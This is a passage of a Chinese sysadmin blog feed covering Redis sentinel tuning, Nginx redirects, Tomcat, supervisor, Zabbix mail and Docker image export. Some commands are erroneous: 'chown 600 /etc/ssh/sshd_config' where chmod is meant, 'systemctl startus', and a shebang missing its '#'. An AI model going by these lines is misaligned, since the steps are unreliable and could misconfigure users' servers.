12345678910[program:haproxy]directory=/usr/local/haproxycommand=/usr/local/haproxy/sbin/haproxy -f /etc/haproxy/haproxy.cfg stdout_logfile=/var/log/haproxy.logautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 六、优化1. [在所有节点] - 内存回收机制优化12345redis&gt; config set maxmemory-policy volatile-lru&quot;OK&quot;redis&gt; config rewrite#此内存回收策略是 最近使用最少的淘汰策略，Redis将回收清理那些超时的(仅仅是超时的)键值对。 具体参考：https://www.jianshu.com/p/677930ffbff0 2. 哨兵sentinel主备切换导致的数据丢失问题两种情况导致的数据丢失： 异步复制过程中导致的数据丢失 因为master –&gt; slave的同步是异步的，所以有可能有部分数据还没复制到slave，master就down机了，此时这部分数据就丢失了。 脑裂导致的数据丢失 脑裂，也就是说某个master所在的机器突然脱离了网络，跟其他slave不能正常通信，但是实际上Master还运行着。此时哨兵会认为master已经宕机了，然后开始重新选举，将其他slave切换成了master。这个时候集群里出现了2个master。 如果某个slave被哨兵选举切换成了master，但是可能client还没来得及切换到新master，还会继续向旧master写数据。因此，旧master再次恢复的时候，会被作为一个slave挂到新的master上去，而自己的数据会被清空，重新从新的master复制数据。而新的master并没有后来client写入的数据，因此，这部分数据就丢失了 [所有节点]-数据丢失问题解决方案： 12345#control data lossmin-slaves-to-write 1min-slaves-max-lag 10#表示：至少有1个slave的数据复制和同步延迟不能超过10秒；如果所有的slave数据复制和延迟都超过了10秒，那么这个时候，master就不会再接受任何请求了。 减少异步复制数据丢失 min-slaves-max-lag这个参数，一旦slave复制数据和ack延时太长，就认为可能master宕机后损失的数据太多了，那么就拒绝写请求。从而把数据丢失降低到可控范围 减少脑裂的数据丢失 如果一个master出现了脑裂，跟其他slave断开了连接，如果不能给指定数量的slave发送数据，那么如果slave超过10秒没有给自己发送ack消息，则直接拒绝客户端的写请求。因此在脑裂环境下，最多就丢失10秒的数据。 3. 高并发环境ulimit优化 [需要重启系统]修改limit是限制： /etc/security/limits.conf 12* soft nofile 65536* hard nofile 65536 修改file-max文件句柄数量 1234echo 6553560 &gt; /proc/sys/fs/file-max并且修改 /etc/sysctl.conf, 加入fs.file-max = 6553560 解除linux系统最大进程数 123vim /etc/security/limits.d/20-nproc.conf #添加如下行：* soft nproc 10240root soft nproc unlimited 七、haproxy验证 基本连接验证 redis-cli -h 192.168.1.186 -p 26380 -a “test123” 后端主从切换后，proxy连接验证 QPS压力测试 (1) 模拟10万次请求 ​ redis-benchmark -h 192.168.1.186 -p 26380 -a test123 -n 100000 -q (2) 模拟10万次访问10万key ​ redis-benchmark -h 192.168.1.186 -p 26380 -a test123 -n 100000 -r 100000 -q (3) 模拟万级用户的并发请求 ​ redis-benchmark -h 192.168.1.186 -p 26380 -a test123 -c 10000 -n 100000 -r 100000 -q","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"sentinel","slug":"sentinel","permalink":"https://garywu520.github.io/tags/sentinel/"},{"name":"redis主从","slug":"redis主从","permalink":"https://garywu520.github.io/tags/redis%E4%B8%BB%E4%BB%8E/"},{"name":"haproxy","slug":"haproxy","permalink":"https://garywu520.github.io/tags/haproxy/"}]},{"title":"redis key过期时间","slug":"redis-key过期时间","date":"2019-09-17T06:50:44.000Z","updated":"2019-09-17T07:19:05.391Z","comments":true,"path":"2019/09/17/redis-key过期时间/","link":"","permalink":"https://garywu520.github.io/2019/09/17/redis-key%E8%BF%87%E6%9C%9F%E6%97%B6%E9%97%B4/","excerpt":"有时候我们并不希望redis的key一直存在。例如缓存，验证码等数据，我们希望它们能在一定时间内自动的被销毁。redis提供了一些命令，能够让我们对key设置过期时间，并且让key过期之后被自动删除。 一、设置/更新Key过期时间 秒级 123redis&gt; EXPIRE keyname &quot;seconds&quot;接口描述：设置一个key在当前时间&quot;seconds&quot;(秒)之后过期。返回1代表设置成功，返回0代表key不存在或者无法设置过期时间。 毫秒级 123redis&gt; PEXPIRE keyname &quot;milliseconds&quot;接口描述：设置一个key在当前时间&quot;milliseconds&quot;(毫秒)之后过期。返回1代表设置成功，返回0代表key不存在或者无法设置过期时间。","text":"有时候我们并不希望redis的key一直存在。例如缓存，验证码等数据，我们希望它们能在一定时间内自动的被销毁。redis提供了一些命令，能够让我们对key设置过期时间，并且让key过期之后被自动删除。 一、设置/更新Key过期时间 秒级 123redis&gt; EXPIRE keyname &quot;seconds&quot;接口描述：设置一个key在当前时间&quot;seconds&quot;(秒)之后过期。返回1代表设置成功，返回0代表key不存在或者无法设置过期时间。 毫秒级 123redis&gt; PEXPIRE keyname &quot;milliseconds&quot;接口描述：设置一个key在当前时间&quot;milliseconds&quot;(毫秒)之后过期。返回1代表设置成功，返回0代表key不存在或者无法设置过期时间。 二、获取Key过期时间 秒级 1234redis&gt; TTL keyname接口描述：获取key的过期时间。如果key存在过期时间，返回剩余生存时间(秒)；如果key是永久的，返回-1；如果key不存在或者已过期，返回-2。 毫秒级 1234redis&gt; PTTL keyname接口描述：获取key的过期时间。如果key存在过期时间，返回剩余生存时间(毫秒)；如果key是永久的，返回-1；如果key不存在或者已过期，返回-2。 三、移除Key的过期时间 移除key的过期时间 123redis&gt; PERSIST key移除key的过期时间，将其转换为永久状态。如果返回1，代表转换成功。如果返回0，代表key不存在或者之前就已经是永久状态。 四、将Key的值设为value，并将key的生存时间设置为seconds秒 将Key的值设为value，并将key的生存时间设置为seconds秒 1234redis&gt; SETEX keyname &lt;过期时间&gt; &lt;value&gt;将键 key 的值设置为 value ， 并将键 key 的生存时间设置为 seconds 秒钟。如果键 key 已经存在， 那么 SETEX 命令将覆盖已有的值。 等同于如下命令： 12redis&gt; SET key valueredis&gt; EXPIRE key seconds SETEX示例： 12345678redis&gt; SETEX cache_user_id 60 10086OKredis&gt; GET cache_user_id #值&quot;10086&quot;redis&gt; TTL cache_user_id #剩余生存时间(integer) 49","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"expire","slug":"expire","permalink":"https://garywu520.github.io/tags/expire/"},{"name":"过期时间","slug":"过期时间","permalink":"https://garywu520.github.io/tags/%E8%BF%87%E6%9C%9F%E6%97%B6%E9%97%B4/"}]},{"title":"redis 参数动态配置","slug":"redis-参数动态配置","date":"2019-09-16T06:51:33.000Z","updated":"2019-09-16T06:53:11.081Z","comments":true,"path":"2019/09/16/redis-参数动态配置/","link":"","permalink":"https://garywu520.github.io/2019/09/16/redis-%E5%8F%82%E6%95%B0%E5%8A%A8%E6%80%81%E9%85%8D%E7%BD%AE/","excerpt":"redis提供了CONFIG SET 动态配置命令，部分参数支持配置热修改而无需重启redis服务。 1. redis动态修改配置12345678# 列出所有支持动态配置的参数127.0.0.1:6379&gt; config get * 1) &quot;dbfilename&quot; 2) &quot;dump.rdb&quot; ...... ......213) &quot;bind&quot;214) &quot;127.0.0.1&quot;","text":"redis提供了CONFIG SET 动态配置命令，部分参数支持配置热修改而无需重启redis服务。 1. redis动态修改配置12345678# 列出所有支持动态配置的参数127.0.0.1:6379&gt; config get * 1) &quot;dbfilename&quot; 2) &quot;dump.rdb&quot; ...... ......213) &quot;bind&quot;214) &quot;127.0.0.1&quot; 使用CONFIG SET 动态配置示例： 1234567891011127.0.0.1:6379&gt; config get appendonly #查看当前设置1) &quot;appendonly&quot;2) &quot;no&quot;127.0.0.1:6379&gt; 127.0.0.1:6379&gt; config set appendonly yes #修改设置(立刻生效)OK127.0.0.1:6379&gt; config get appendonly #查看当前设置1) &quot;appendonly&quot;2) &quot;yes&quot;127.0.0.1:6379&gt; config rewrite #保存到配置文件ok 注：如果 执行config rewrite命令出现ERR CONFIG REWRITE failed: Permission denied错误，则说明redis启动的时候没有指定redis.conf文件 2. 其他：动态更新监听地址-bind参数配置12127.0.0.1:6379&gt; config set bind &quot;127.0.0.1 11.12.13.14&quot;(error) ERR Unsupported CONFIG parameter: bind 出现上面的错误 是因为并不是所有配置都可以在线修改，比如pidfile，port, 以及bind 这些参数是不允许修改的","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"CONFIG","slug":"CONFIG","permalink":"https://garywu520.github.io/tags/CONFIG/"}]},{"title":"SFTP上传下载命令","slug":"SFTP上传下载命令","date":"2019-09-10T08:20:36.000Z","updated":"2019-09-10T08:34:55.169Z","comments":true,"path":"2019/09/10/SFTP上传下载命令/","link":"","permalink":"https://garywu520.github.io/2019/09/10/SFTP%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/","excerpt":"SFTP顾名思义，即它是基于SSH的上传与下载功能。它是lrzsz之外的另一选择。不需要服务器部署FTP服务 Mac端由于无法使用lrzsz，故SFTP是个不错的选择","text":"SFTP顾名思义，即它是基于SSH的上传与下载功能。它是lrzsz之外的另一选择。不需要服务器部署FTP服务 Mac端由于无法使用lrzsz，故SFTP是个不错的选择 1. ssh配置文件123456789101112131415Port 22Protocol 2RSAAuthentication yesPubkeyAuthentication yesAuthorizedKeysFile .ssh/authorized_keysPasswordAuthentication noPermitEmptyPasswords noUsePAM yesPrintMotd noPrintLastLog noUseDNS noSubsystem sftp /usr/libexec/openssh/sftp-server ListenAddress 0.0.0.0:22ListenAddress xx.xx.xx.xx:22 注：需要确保 sftp配置的/usr/libexec/openssh/sftp-server 文件是存在的，重启sshd服务 2. Xshell连接SFTP​ 连接需要指定密钥 3. 上传与下载 单个文件下载 1&gt; get remote-file [local-file] 单个文件上传 12&gt; put 打开本地目录选择文件后上传 中断连接 1&gt; bye","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"sftp","slug":"sftp","permalink":"https://garywu520.github.io/tags/sftp/"},{"name":"lrzsz","slug":"lrzsz","permalink":"https://garywu520.github.io/tags/lrzsz/"},{"name":"mac","slug":"mac","permalink":"https://garywu520.github.io/tags/mac/"},{"name":"上传下载","slug":"上传下载","permalink":"https://garywu520.github.io/tags/%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/"}]},{"title":"xshell ssh连接错误10053","slug":"xshell-ssh连接错误10053","date":"2019-08-29T12:40:46.000Z","updated":"2019-08-29T12:43:09.176Z","comments":true,"path":"2019/08/29/xshell-ssh连接错误10053/","link":"","permalink":"https://garywu520.github.io/2019/08/29/xshell-ssh%E8%BF%9E%E6%8E%A5%E9%94%99%E8%AF%AF10053/","excerpt":"Error12Socket error Event: 32 Error: 10053.Connection closing...Socket close 原因12# 很有可能有人恶意将系统根目录或部分核心目录修改了777权限,导致服务器登录异常history |grep 777","text":"Error12Socket error Event: 32 Error: 10053.Connection closing...Socket close 原因12# 很有可能有人恶意将系统根目录或部分核心目录修改了777权限,导致服务器登录异常history |grep 777 解决方法恢复SSH登录相关文件权限 123chmod 400 /etc/ssh/*chmod 640 /etc/ssh/*.pubchown 600 /etc/ssh/sshd_config 1systemctl restart sshd","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ssh","slug":"ssh","permalink":"https://garywu520.github.io/tags/ssh/"},{"name":"xshell","slug":"xshell","permalink":"https://garywu520.github.io/tags/xshell/"},{"name":"10053","slug":"10053","permalink":"https://garywu520.github.io/tags/10053/"}]},{"title":"Nginx 301重定向到HTTPS的问题","slug":"Nginx-301重定向到HTTPS的问题","date":"2019-08-23T08:14:30.000Z","updated":"2019-08-23T08:38:22.294Z","comments":true,"path":"2019/08/23/Nginx-301重定向到HTTPS的问题/","link":"","permalink":"https://garywu520.github.io/2019/08/23/Nginx-301%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0HTTPS%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"Nginx强制配置301永久跳转后，APP发起POST请求会出现405错误，这是因为301跳转的操作让浏览器把POST请求变成了GET请求。 示例 301跳转示例： 1return 301 https://www.xxx.com$request_uri; 解决办法： 123return 307 https://www.xxx.com$request_uri;或return 308 https://www.xxx.com$request_uri;","text":"Nginx强制配置301永久跳转后，APP发起POST请求会出现405错误，这是因为301跳转的操作让浏览器把POST请求变成了GET请求。 示例 301跳转示例： 1return 301 https://www.xxx.com$request_uri; 解决办法： 123return 307 https://www.xxx.com$request_uri;或return 308 https://www.xxx.com$request_uri; 状态码 301 Moved Permanently 被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一 307 Temporary Redirect 请求的资源现在临时从不同的URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求 308 永久重定向 308状态代码[永久重定向],类似于301(永久移动)，但不允许将请求方法从POST更改为GET. 301和308的区别在 HTTP 协议中， 308 Permanent Redirect（永久重定向）是表示重定向的响应状态码，说明请求的资源已经被永久的移动到了由 Location 首部指定的 URL 上。在重定向过程中，请求方法和消息主体不会发生改变! 然而在 301 状态码的情况下，请求方法有时候会被客户端错误地修改为 GET 方法 参考：Linux运维笔记","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"301","slug":"301","permalink":"https://garywu520.github.io/tags/301/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"GET","slug":"GET","permalink":"https://garywu520.github.io/tags/GET/"},{"name":"POST","slug":"POST","permalink":"https://garywu520.github.io/tags/POST/"},{"name":"307","slug":"307","permalink":"https://garywu520.github.io/tags/307/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://garywu520.github.io/tags/HTTPS/"}]},{"title":"Tomcat 内存优化配置","slug":"Tomcat-内存优化配置","date":"2019-08-22T05:35:22.000Z","updated":"2019-08-22T05:38:51.159Z","comments":true,"path":"2019/08/22/Tomcat-内存优化配置/","link":"","permalink":"https://garywu520.github.io/2019/08/22/Tomcat-%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96%E9%85%8D%E7%BD%AE/","excerpt":"以Tomcat 8.x为例，来说明内存优化配置 一、修改配置如下修改 {tomcat_dir}/bin/catalina.sh ，搜索“Execute” 行，在下面加入如下行： 12# ----- Execute The Requested Command -----------------------------------------JAVA_OPTS=&quot;$JAVA_OPTS -server -Xms256m -Xmx512m&quot; 参数： -Xms256m：初始化堆内存大小（注意，不加M的话单位是KB）-Xmx512m：最大堆内存大小 -XX:PermSize=128M：初始化类加载内存池大小 注：以下两个参数在Tomcat8中，启动会报错 12-XX:MaxPermSize=256M：最大类加载内存池大小 -XX:MaxNewSize=256M：设置JAVA堆区域新生代内存的最大可分配大小","text":"以Tomcat 8.x为例，来说明内存优化配置 一、修改配置如下修改 {tomcat_dir}/bin/catalina.sh ，搜索“Execute” 行，在下面加入如下行： 12# ----- Execute The Requested Command -----------------------------------------JAVA_OPTS=&quot;$JAVA_OPTS -server -Xms256m -Xmx512m&quot; 参数： -Xms256m：初始化堆内存大小（注意，不加M的话单位是KB）-Xmx512m：最大堆内存大小 -XX:PermSize=128M：初始化类加载内存池大小 注：以下两个参数在Tomcat8中，启动会报错 12-XX:MaxPermSize=256M：最大类加载内存池大小 -XX:MaxNewSize=256M：设置JAVA堆区域新生代内存的最大可分配大小 二、确认进程已经杀死12bin/shutdown.sh通过ps命令查看此tomcat进程是否依然存在，如果存在则使用kill命令 三、启动Tomcat服务123bin/startup.shnetstat -lntup|grep 8081tail -f log/catalina.out","categories":[],"tags":[{"name":"tomcat","slug":"tomcat","permalink":"https://garywu520.github.io/tags/tomcat/"},{"name":"jvm","slug":"jvm","permalink":"https://garywu520.github.io/tags/jvm/"},{"name":"jps","slug":"jps","permalink":"https://garywu520.github.io/tags/jps/"},{"name":"内存","slug":"内存","permalink":"https://garywu520.github.io/tags/%E5%86%85%E5%AD%98/"}]},{"title":"nginx快速部署文件下载服务","slug":"nginx快速部署文件下载服务","date":"2019-08-21T10:14:08.000Z","updated":"2019-08-21T10:47:10.184Z","comments":true,"path":"2019/08/21/nginx快速部署文件下载服务/","link":"","permalink":"https://garywu520.github.io/2019/08/21/nginx%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%9C%8D%E5%8A%A1/","excerpt":"","text":"让nginx直接下载文件的方法在nginx.conf下增加配置 1234567891011121314server &#123; listen 80; access_log logs/access.download.com.log main; error_log logs/error.download.com.log; server_name download.com; root /data/android;#新增配置区域 location /app &#123; default_type application/octet-stream; &#125; &#125; 将下载的文件放在/data/android/app目录下, reload Nginx，之后就可以通过download.com访问了","categories":[],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"nginx下载","slug":"nginx下载","permalink":"https://garywu520.github.io/tags/nginx%E4%B8%8B%E8%BD%BD/"}]},{"title":"shell脚本监控TraceRoute","slug":"shell脚本监控TraceRoute","date":"2019-08-15T06:28:32.000Z","updated":"2019-08-15T06:53:21.463Z","comments":true,"path":"2019/08/15/shell脚本监控TraceRoute/","link":"","permalink":"https://garywu520.github.io/2019/08/15/shell%E8%84%9A%E6%9C%AC%E7%9B%91%E6%8E%A7TraceRoute/","excerpt":"","text":"shell脚本逻辑： 不能以 trace命令返回值作为成功或失败的依据，不可达的地址返回值也是0 取文本的最后一跳信息，当最后一跳包含$IP，则视为Trace正常。若$IP的检索结果等于0，则视为Trace失败。 123456789101112!/bin/env bashIP=xx.xx.xx.xxFILE=/tmp/besttrace.txtEMAIL=xxx@xx.com/sbin/besttrace -q 1 $IP &gt;$FILENUM=`grep &quot;$IP&quot; $FILE|awk NR==2|wc -l`if [ $NUM -lt 1 ];then INFO=`cat $FILE` #发送告警邮件 echo -e &quot;邮件发自$HOSTNAME\\n详情如下:\\n\\n$INFO&quot;|mail -s &quot;TraceRoute告警&quot; $EMAILfi","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"MTR","slug":"MTR","permalink":"https://garywu520.github.io/tags/MTR/"},{"name":"traceroute","slug":"traceroute","permalink":"https://garywu520.github.io/tags/traceroute/"},{"name":"besttrace","slug":"besttrace","permalink":"https://garywu520.github.io/tags/besttrace/"}]},{"title":"zabbix报警邮件内容带附件-解决方法","slug":"zabbix报警邮件内容带附件-解决方法","date":"2019-08-15T02:32:47.000Z","updated":"2019-08-15T02:44:46.898Z","comments":true,"path":"2019/08/15/zabbix报警邮件内容带附件-解决方法/","link":"","permalink":"https://garywu520.github.io/2019/08/15/zabbix%E6%8A%A5%E8%AD%A6%E9%82%AE%E4%BB%B6%E5%86%85%E5%AE%B9%E5%B8%A6%E9%99%84%E4%BB%B6-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/","excerpt":"zabbix设置邮件脚本报警的后，测试发现，邮件正文内容变成了tcmime.1278.1278.1724.bin 或 ATT00001.bin 解决方案1. 安装dos2unix123wget http://mirror.centos.org/centos/7/os/x86_64/Packages/dos2unix-6.0.3-7.el7.x86_64.rpmrpm -Uvh dos2unix-6.0.3-7.el7.x86_64.rpm","text":"zabbix设置邮件脚本报警的后，测试发现，邮件正文内容变成了tcmime.1278.1278.1724.bin 或 ATT00001.bin 解决方案1. 安装dos2unix123wget http://mirror.centos.org/centos/7/os/x86_64/Packages/dos2unix-6.0.3-7.el7.x86_64.rpmrpm -Uvh dos2unix-6.0.3-7.el7.x86_64.rpm 2. 修改sendmail.sh1cd /usr/lib/zabbix/alertscripts/ vim sendmail.sh 123456#!/bin/bash#export.UTF-8 //解决发送的中文变成了乱码的问题FILE=/tmp/mailtmp.txt echo &quot;$3&quot; &gt;$FILE/bin/dos2unix -k $FILE //解决了发送的邮件内容变成附件的问题。/bin/mail -s &quot;$2&quot; $1 &lt; $FILE 123touch /tmp/mailtmp.txtchown zabbix.zabbix /tmp/mailtmp.txtls -lh /tmp/mailtmp.txt","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"报警","slug":"报警","permalink":"https://garywu520.github.io/tags/%E6%8A%A5%E8%AD%A6/"}]},{"title":"supervisor部署","slug":"supervisor部署","date":"2019-08-12T06:17:53.000Z","updated":"2019-08-12T07:18:00.461Z","comments":true,"path":"2019/08/12/supervisor部署/","link":"","permalink":"https://garywu520.github.io/2019/08/12/supervisor%E9%83%A8%E7%BD%B2/","excerpt":"环境 CentOS7 安装123yum install -y epel-releaseyum install -y supervisorsystemctl enable supervisord cat /etc/supervisord.conf 1&gt; &#x2F;etc&#x2F;supervisord.conf #清空默认模板文件，将下面的内容贴到本文件","text":"环境 CentOS7 安装123yum install -y epel-releaseyum install -y supervisorsystemctl enable supervisord cat /etc/supervisord.conf 1&gt; &#x2F;etc&#x2F;supervisord.conf #清空默认模板文件，将下面的内容贴到本文件 cat /etc/supervisord.conf 1234567891011121314151617181920212223[unix_http_server]file=/var/run/supervisor.sock ; (the path to the socket file)[supervisord]logfile=/var/log/supervisord.log ; (main log file;default $CWD/supervisord.log)logfile_maxbytes=50MB ; (max main logfile bytes b4 rotation;default 50MB)logfile_backups=10 ; (num of main logfile rotation backups;default 10)loglevel=info ; (log level;default info; others: debug,warn,trace)pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid)nodaemon=false ; (start in foreground if true;default false)minfds=1024 ; (min. avail startup file descriptors;default 1024)minprocs=200 ; (min. avail process descriptors;default 200)[rpcinterface:supervisor]supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface[supervisorctl]serverurl=unix:///var/run/supervisor.sock ; use a unix:// URL for a unix socket[include]files = /etc/supervisord.d/*.conf; environment=JAVA_HOME=&quot;/usr/local/jdk&quot;,JRE_HOME=&quot;/usr/local/jdk/jre&quot; 12systemctl start supervisordsystemctl startus supervisord","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"supervisor","slug":"supervisor","permalink":"https://garywu520.github.io/tags/supervisor/"},{"name":"supervisorctl","slug":"supervisorctl","permalink":"https://garywu520.github.io/tags/supervisorctl/"},{"name":"supervisord","slug":"supervisord","permalink":"https://garywu520.github.io/tags/supervisord/"}]},{"title":"supervisor管理二进制程序","slug":"supervisor管理二进制程序","date":"2019-08-08T06:57:10.000Z","updated":"2020-02-06T04:34:26.025Z","comments":true,"path":"2019/08/08/supervisor管理二进制程序/","link":"","permalink":"https://garywu520.github.io/2019/08/08/supervisor%E7%AE%A1%E7%90%86%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"有时候需要使用supervisor管理二进制程序，区别是需要进入到相关目录才能运行，这时候就需要directory来指定工作目录了。 cat /etc/supervisor.conf 1234567891011[program:app1]directory=/usr/local/auto/app1command=/usr/local/auto/app1/Serverstdout_logfile=/usr/local/auto/app1/app1.logstderr_logfile=/usr/local/auto/app1/app1.logautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true stderr_logfile=/usr/local/auto/app1/app1.log 这个错误输出，可以帮助你解决启动错误的问题","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"supervisor","slug":"supervisor","permalink":"https://garywu520.github.io/tags/supervisor/"},{"name":"二进制","slug":"二进制","permalink":"https://garywu520.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]},{"title":"docker导出导入镜像","slug":"docker导出导入镜像","date":"2019-08-08T03:25:02.000Z","updated":"2019-08-08T03:31:27.087Z","comments":true,"path":"2019/08/08/docker导出导入镜像/","link":"","permalink":"https://garywu520.github.io/2019/08/08/docker%E5%AF%BC%E5%87%BA%E5%AF%BC%E5%85%A5%E9%95%9C%E5%83%8F/","excerpt":"","text":"当基于基础镜像，配置并优化了相关环境后，重新打包制作的Docker镜像需要导出保存时，就需要导出导入操作了。 导出镜像如果要导出镜像到本地文件，可以使用docker save命令. 假设要导出的新镜像名为centos_v1 12docker imagesdocker save -o centos_v1.tar centos_v1 载入镜像可以使用docker load从导出的本地文件中再导入到本地镜像库 123docker load --input centos_v1.tar或docker load &lt; centos_v1.tar","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"images","slug":"images","permalink":"https://garywu520.github.io/tags/images/"},{"name":"导入导出","slug":"导入导出","permalink":"https://garywu520.github.io/tags/%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"}]},{"title":"使用supervisor管理Tomcat进程","slug":"使用supervisor管理Tomcat进程","date":"2019-08-07T10:10:23.000Z","updated":"2020-02-06T04:35:05.589Z","comments":true,"path":"2019/08/07/使用supervisor管理Tomcat进程/","link":"","permalink":"https://garywu520.github.io/2019/08/07/%E4%BD%BF%E7%94%A8supervisor%E7%AE%A1%E7%90%86Tomcat%E8%BF%9B%E7%A8%8B/","excerpt":"使用 supervisord 监控管理的进程必须以 nodaemon 启动，而 tomcat 的 startup.sh 脚本是daemon方式的，现在不能用startup.sh形式，所以要用catalina.sh，且在后面加 run。","text":"使用 supervisord 监控管理的进程必须以 nodaemon 启动，而 tomcat 的 startup.sh 脚本是daemon方式的，现在不能用startup.sh形式，所以要用catalina.sh，且在后面加 run。 supervisor tomcat启动配置文件1234567891011[program:tomcat_8081]command=/usr/local/tomcat_8081/bin/catalina.sh runstdout_logfile=/usr/local/tomcat_8081/logs/catalina.outstderr_logfile=/usr/local/auto/app1/app1.log environment=JAVA_HOME=&quot;/usr/local/jdk&quot;,JRE_HOME=&quot;/usr/local/jdk/jre&quot;autostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true stderr_logfile=/usr/local/auto/app1/app1.log 这个错误输出，可以帮助你解决启动错误的问题 123456789supervisorctl rereadsupervisorctl add tomcat_8081supervisorctl restart tomcat_8081supervisorctl status移除配置(1)删除配置文件(2)supervisorctl reread 重新读取配置文件(3)supervisorctl update 更新配置 问题解决upervisor启动Tomcat等JAVA程序，log报错： 12Neither the JAVA_HOME nor the JRE_HOME environment variable is definedAt least one of these environment variable is needed to run this program 解决方法： 方式一：如果是在docker容器内运行的supervisor和tomcat, 请将JAVA环境变量从/etc/profile 剪切到 ~/.bashrc目录，并source ~/.bashrc 方式二：在/etc/supervisord.conf文件末尾，添加如下行： 123environment=JAVA_HOME=&quot;/usr/local/jdk&quot;,JRE_HOME=&quot;/usr/local/jdk/jre&quot;#注：多个环境变量使用英文逗号隔开 重启supervisor服务后，再使用supervisor重启tomcat即可","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"tomcat","slug":"tomcat","permalink":"https://garywu520.github.io/tags/tomcat/"},{"name":"supervisor","slug":"supervisor","permalink":"https://garywu520.github.io/tags/supervisor/"}]},{"title":"Tomcat多实例部署","slug":"Tomcat多实例部署","date":"2019-08-07T06:09:32.000Z","updated":"2019-08-07T07:01:53.745Z","comments":true,"path":"2019/08/07/Tomcat多实例部署/","link":"","permalink":"https://garywu520.github.io/2019/08/07/Tomcat%E5%A4%9A%E5%AE%9E%E4%BE%8B%E9%83%A8%E7%BD%B2/","excerpt":"首先了解下Tomcat服务启动所需端口号 Server Port：该端口用于监听关闭tomcat的shutdown命令，默认端口:8005 Connector Port: 该端口用于监听HTTP的请求，默认端口：8080 AJP Port: 该端口用于监听AJP(Apache JServ Protocal)协议上的请求，通常用于整合HTTP服务器，默认端口: 8009【用不到可注释】 Redirect Port: 重定向端口，出现在Connector配置中。默认端口：8443 ​ 作用：当用户用http请求某个资源，而该资源本身又被设置了必须要https方式访问，此时Tomcat会自动重定向到这个redirectPort设置的https端口。","text":"首先了解下Tomcat服务启动所需端口号 Server Port：该端口用于监听关闭tomcat的shutdown命令，默认端口:8005 Connector Port: 该端口用于监听HTTP的请求，默认端口：8080 AJP Port: 该端口用于监听AJP(Apache JServ Protocal)协议上的请求，通常用于整合HTTP服务器，默认端口: 8009【用不到可注释】 Redirect Port: 重定向端口，出现在Connector配置中。默认端口：8443 ​ 作用：当用户用http请求某个资源，而该资源本身又被设置了必须要https方式访问，此时Tomcat会自动重定向到这个redirectPort设置的https端口。 1. Tomcat安装123tar -zxvf apache-tomcat-8.0.27.tar.gz cp -a apache-tomcat-8.0.27 tomcat8_1cp -a apache-tomcat-8.0.27 tomcat8_2 2. 分别修改两个Tomcat实例的端口配置目的是：避免端口冲突。 第1个实例端口-配置 – tomcat8_1/conf/server.xml Server Port: 8001 Connector Port: 8081 